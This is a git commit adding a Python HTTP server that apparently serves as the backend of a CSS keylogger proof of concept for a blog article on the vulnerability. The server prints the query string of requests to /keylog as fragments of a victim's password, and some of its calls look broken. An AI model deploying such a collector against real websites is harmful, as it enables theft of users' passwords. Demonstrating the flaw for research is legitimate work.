755d94a75178f89afef74e24f3841b17b651d9f8
Michael Belousov <michael.belousov98@gmail.com>
2019-05-10 09:14:10 -0400

    started proof of concept for css keylogger article with backend

---
+++ blog/css_keylg_example/css_keylg_backend.py
@@ -0,0 +1,65 @@
+#/usr/bin/env python3
+
+"""
+This is for research only!
+I am NOT using it (after all, my website is static), and
+I consider it highly unethical to use. I am merely demonstrating
+a vulnerability.
+"""
+
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+from argparse import ArgumentParser
+import sys
+
+
+# TODO: use metaclass to make uninstantiable, it's a namespace not a class
+class CSSKeyLogger:
+    """CSS Key logging server components"""
+
+    class ReqHandler(SimpleHTTPRequestHandler):
+        """
+        handles requests to the server for keylogging,
+        while also accessing the file system
+        """
+
+        def do_GET(self):
+            """handle GET requests"""
+
+            req = self
+            print(req.path)
+            _, _, resrc = req.path.partition('/') 
+
+            if resrc == 'keylog':
+                self.send_response(200)
+                self.send_headers('Content-type', 'text/plaintext')
+                self.end_headers()
+                _, _, query = req.path.rpartition('?')
+                print(f'password contains "{query}"')
+                self.wfile('hello')
+            else:
+                super().do_GET()
+
+
+    class Server(HTTPServer):  # TODO: add threading mixin
+        """Server with custom request handler"""
+        def __init__(self, host='localhost', port=8000):
+            super().__init__((host, port), CSSKeyLogger.ReqHandler)
+
+
+if __name__ == '__main__':
+    argparser = ArgumentParser(description='Run the server')
+    argparser.add_argument('-p', '--port',
+                           metavar=int,
+                           default=8000,
+                           help='the port to serve from')
+    argparser.add_argument('-i', '--host',
+                           default='localhost',
+                           help='the host address to serve from')
+    args = argparser.parse_args()
+    httpd = CSSKeyLogger.Server(args.host, args.port)
+    try:
+        print(f'serving at http://{args.host}:{args.port}')
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print('exiting')
+        sys.exit(0)
